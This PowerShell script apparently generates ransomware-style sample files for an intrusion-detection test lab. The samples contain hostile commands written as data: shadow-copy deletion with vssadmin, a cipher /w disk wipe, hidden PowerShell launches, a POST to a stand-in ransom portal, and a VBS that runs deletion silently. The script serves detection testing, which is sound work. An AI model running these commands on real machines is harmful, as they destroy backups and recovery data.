[CmdletBinding()]
param(
    [string]$WorkspaceRoot = "C:\NIDS_Workspace",
    [string]$TargetDir = ""
)

$ErrorActionPreference = "Stop"

$workspaceRootResolved = [System.IO.Path]::GetFullPath($WorkspaceRoot)
$incomingRoot = Join-Path $workspaceRootResolved "NIDS_TestLab\artifacts\incoming"
$runToken = "ransomware-static-$(Get-Date -Format yyyyMMdd-HHmmss)"
$targetDirResolved = if ($TargetDir.Trim() -ne "") {
    [System.IO.Path]::GetFullPath($TargetDir)
} else {
    Join-Path $incomingRoot $runToken
}

New-Item -ItemType Directory -Force -Path $targetDirResolved | Out-Null

@'
$lockerKey = "sample-lab-key"
vssadmin delete shadows /all /quiet
powershell -nop -w hidden
Invoke-WebRequest -Uri https://pay-portal.example.invalid/key -Method Post
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "01_shadowcopy_cleanup.ps1") -Encoding ASCII

@'
import os
import subprocess

EXTENSION = ".locked"
subprocess.Popen("cmd.exe /c whoami", shell=True)
for root, _, files in os.walk("."):
    for name in files:
        if name.endswith(".txt"):
            print(f"encrypt:{os.path.join(root, name)}{EXTENSION}")
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "02_encryptor_stub.py") -Encoding ASCII

@'
{
  "wallet": "bc1qexamplewalletaddress",
  "token": "sample-ransom-portal-token",
  "extension": ".locked",
  "command": "checkin"
}
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "03_payment_portal.json") -Encoding ASCII

@'
@echo off
cmd.exe /c vssadmin delete shadows /all /quiet
cipher /w:C:\
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "04_recovery_killer.bat") -Encoding ASCII

@'
MZ
Sample ransomware loader fixture.
cmd.exe
vssadmin delete shadows
powershell
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "05_payload_stub.exe") -Encoding ASCII

@'
How to restore from backups
1. Verify offline copies
2. Rotate credentials
3. Rebuild endpoints
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "06_restore_guide.txt") -Encoding ASCII

$archiveSeedRoot = Join-Path $targetDirResolved "_ransom_archive_seed"
$dropRoot = Join-Path $archiveSeedRoot "bundle"
New-Item -ItemType Directory -Force -Path $dropRoot | Out-Null

@'
Set sh = CreateObject("WScript.Shell")
sh.Run "cmd.exe /c vssadmin delete shadows /all /quiet", 0
'@ | Set-Content -LiteralPath (Join-Path $dropRoot "wipe.vbs") -Encoding ASCII

@'
function Invoke-Staging {
    powershell -nop -c "Write-Output encrypt"
}
'@ | Set-Content -LiteralPath (Join-Path $dropRoot "stager.ps1") -Encoding ASCII

$zipPath = Join-Path $targetDirResolved "07_ransom_ops.zip"
Compress-Archive -Path (Join-Path $dropRoot "*") -DestinationPath $zipPath -Force
Remove-Item -LiteralPath $archiveSeedRoot -Recurse -Force

Write-Output "Staged: $targetDirResolved"
